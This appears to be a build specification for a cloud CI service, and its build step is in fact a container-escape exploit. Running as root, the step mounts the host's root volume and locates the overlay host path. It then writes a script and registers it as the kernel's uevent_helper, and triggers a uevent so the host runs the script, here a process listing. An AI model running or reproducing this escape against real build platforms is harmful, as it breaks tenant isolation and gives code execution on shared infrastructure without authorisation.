version: 0.1
component: build
timeoutInSeconds: 6000
runAs: root
shell: bash
env:
  variables:
    "testEnv" : "testValue"

steps:
  - type: Command
    name: "Build Source"
    command: |
      #ls
      echo "test"
      #set
      #cat /proc/1/cgroup
      echo "-------proc------"
      whoami
      #fdisk -l
      ls /dev/
      echo "_________cmdline___________"
      cat /proc/cmdline
      echo "_____________________"
      #cat /workspace/script/StepStep_CommandV1_1.sh
      echo "-------------"
      #cat /workspace/script/Step0.sh
      echo "_______mounting_____"
      mkdir /test
      mount /dev/mapper/vg00-root /test
      chroot /mnt
      host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
      echo $host_path
      cat << EOF > /trigger.sh
      #!/bin/sh
      ps auxf > output.txt
      EOF
      chmod +x /trigger.sh
      cat /trigger.sh
      df -k
      echo "$host_path/trigger.sh" > /sys/kernel/uevent_helper
      echo change > /sys/class/mem/null/uevent
      cat output.txt
    onFailure:
      - type: Command
        command: |
          echo "Handling Failure"
          echo "Failure successfully handled"
        timeoutInSeconds: 400
        runAs: root

#artifacts:
#  - name: hello-dev-jar
#    type: BINARY
#    files:
#      - target/hello-dev-1.0-SNAPSHOT.jar
